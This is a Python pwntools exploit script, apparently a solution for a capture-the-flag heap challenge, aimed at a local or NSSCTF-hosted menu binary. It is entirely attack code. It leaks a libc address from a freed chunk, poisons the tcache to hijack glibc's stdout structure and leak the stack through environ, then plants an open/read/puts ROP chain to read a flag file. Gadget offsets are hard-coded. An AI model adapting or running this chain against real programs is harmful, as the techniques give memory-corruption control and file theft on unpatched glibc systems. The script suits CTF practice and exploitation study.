from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
#io = remote("node4.anna.nssctf.cn", 28784)
elf = ELF("./pwn")
libc = elf.libc

def debug():
        gdb.attach(io)
        pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b'Choice: '
def add(size, content, flag=True):
        sla(menu, b'1')
        sla(b'size:', byte(size))
        if flag:
                sla(b'content:', content)
        else:
                sda(b'content:', content)

def dele(idx):
        sla(menu, b'2')
        sla(b'idx:', byte(idx))

def show(idx):
        sla(menu, b'3')
        sla(b'idx:', byte(idx))

def backdoor(idx):
        sla(menu, b'666')
        sla(b'idx:', byte(idx))

for i in range(10):
        add(0x80, b'A')
for i in range(7):
        dele(i)
backdoor(8)
show(8)
libc.address = u64(ruf(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1ecbe0
info('libc_base', libc.address)

stdout = libc.sym._IO_2_1_stdout_
environ = libc.sym.environ
info('stdout', stdout)
info('environ_addr', environ)

dele(7)
add(0x80, b'A') # 0
dele(8)

add(0x70, b'A') # 1
pay = p64(0) + p64(0x91) + p64(stdout)
add(0x70, pay)  # 2

add(0x80, b'A') # 3  [2 can control 3]
pay = p64(0xfbad1800) + p64(0)*3 + p64(environ) + p64(environ+8)
add(0x80, pay)  # 4

env = u64(ruf(b'\x7f')[-6:].ljust(8, b'\x00'))
ret = env - 0x120
info('environ', env)
info('add_ret', ret)

dele(3)
dele(2)

pay = p64(0) + p64(0x91) + p64(ret-8)
add(0x70, pay)
add(0x80, b'A')
rdi = libc.address + 0x0000000000023b6a # pop rdi ; ret
rsi = libc.address + 0x000000000002601f # pop rsi ; ret
rdx = libc.address + 0x0000000000142c92 # pop rdx ; ret
o = libc.sym.open
r = libc.sym.read
w = libc.sym.write
p = libc.sym.puts
flag = ret + 0x200
pay = b'./flag\x00\x00'
pay += p64(rdi) + p64(ret-8) + p64(rsi) + p64(0) + p64(o)
pay += p64(rdi) + p64(3) + p64(rsi) + p64(flag) + p64(rdx) + p64(0x50) + p64(r)
#pay += p64(rdi) + p64(1) + p64(rsi) + p64(flag) + p64(rdx) + p64(0x50) + p64(w)
pay += p64(rdi) + p64(flag) + p64(p)
add(0x80, pay, False)

#debug()
sh()
